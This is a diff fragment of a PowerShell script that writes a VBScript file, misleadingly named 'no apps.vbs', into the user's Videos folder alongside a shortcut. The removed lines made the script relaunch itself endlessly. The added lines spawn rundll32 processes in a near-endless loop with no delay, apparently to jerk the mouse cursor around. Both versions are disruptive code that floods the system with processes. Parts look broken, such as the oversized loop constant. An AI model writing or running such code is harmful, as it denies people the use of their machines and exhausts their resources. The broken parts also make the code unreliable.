@@ -119,12 +119,29 @@ $shortcut.Save()
 
 # Create VBScript file with custom code
 $vbsScript = @"
-    Set objShell = CreateObject("WScript.Shell")
-    objShell.Run "wscript.exe no apps.vbs", 1, False
+Set objShell = CreateObject("WScript.Shell")
 
-    ' Adjust the delay time (in milliseconds) between each loop iteration
-    WScript.Sleep 0
-Loop
+' Define the screen boundaries
+Const screenWidth = 50 ' Update with your screen width
+Const screenHeight = 50 ' Update with your screen height
+
+' Define the maximum number of steps to take
+Const maxSteps = 1000000000000000000000000000000000000000000000000000000000000000 ' Adjust as needed
+
+' Generate random movements
+Randomize
+
+For i = 1 To maxSteps
+    ' Generate random coordinates
+    x = Int((screenWidth - 1) * Rnd + 1)
+    y = Int((screenHeight - 1) * Rnd + 1)
+    
+    ' Move the cursor
+    objShell.Run "rundll32 user32.dll,SetCursorPos " & x & "," & y, 0, False
+    
+    ' Pause for a short duration
+    WScript.Sleep 0 ' Adjust as needed
+Next
 "@
 
 $vbsFilePath = [System.IO.Path]::Combine($videosPath, "no apps.vbs")
